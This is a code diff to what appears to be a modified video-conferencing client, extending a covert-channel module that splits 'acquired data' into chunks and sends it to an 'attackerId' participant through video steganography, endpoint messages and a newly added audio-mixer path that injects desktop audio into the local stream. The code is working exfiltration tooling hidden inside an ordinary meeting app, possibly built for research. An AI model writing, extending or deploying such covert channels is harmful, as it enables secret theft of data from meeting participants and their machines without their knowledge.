@@ -1,5 +1,8 @@
 /* global APP, splitString, getDefaultSettings */
+import { AudioMixerEffect } from '../react/features/stream-effects/audio-mixer/AudioMixerEffect';
+
 import VideoSteganoEffect from './VideoSteganoEffect';
+
 
 export const defaultConfigurationValues = {
     method: 'plain',
@@ -52,7 +55,7 @@ class CovertChannelMethods {
      */
     static async useVideo(acquiredData, usedMethod) {
         const localVideo = APP.conference.localVideo;
-        const steganoEffect = this._createSteganoEffect(localVideo.stream, acquiredData, usedMethod);
+        const steganoEffect = await this._createSteganoEffect(localVideo.stream, acquiredData, usedMethod);
 
         await localVideo.setEffect(steganoEffect);
     }
@@ -62,7 +65,12 @@ class CovertChannelMethods {
      * @param {any} data - specified data to be sent
      */
     static async useAudio(data) {
-        console.log(data);
+        const desktopAudio = APP.conference._desktopAudioStream;
+        const localAudio = APP.conference.localAudio;
+        const mixerEffect = new AudioMixerEffect(desktopAudio);
+
+
+        await localAudio.setEffect(mixerEffect);
     }
 }
 
@@ -133,6 +141,7 @@ export class ExtractionHandler {
         }
         for (const chunkData of splitString(data, this.configuration.chunkSize)) {
             // send data using corresponding method
+            console.log('DATA:', chunkData);
             await CovertChannelMethods.options[this.configuration.method](chunkData, attackerId);
         }
         APP.conference.sendEndpointMessage(attackerId, {
@@ -155,7 +164,8 @@ export class ExtractionHandler {
                 // Define custom event 'extractionEnded' and trigger it.
                 event.dispatchEvent(new CustomEvent('extractionEnded', {
                     detail: {
-                        extractedData: this.fullData
+                        extractedData: this.fullData,
+                        config: this.configuration
                     }
                 }));
             }
